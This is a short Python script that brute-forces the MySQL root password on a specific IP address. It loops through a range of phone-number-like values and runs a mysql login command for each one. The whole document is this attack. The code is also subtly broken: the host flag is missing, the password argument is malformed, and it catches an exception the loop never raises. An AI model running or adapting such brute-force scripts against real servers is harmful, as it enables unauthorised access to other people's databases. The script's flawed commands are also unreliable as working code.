import os
import random
import time

import requests

try:
    i = 13000000000
    while i<99999999999:
        os.system(f"mysql -u root 38.55.196.151 -p,{i} > nul")
        print(i)
        i += 1
except requests.exceptions.ConnectTimeout:
    print("time out")
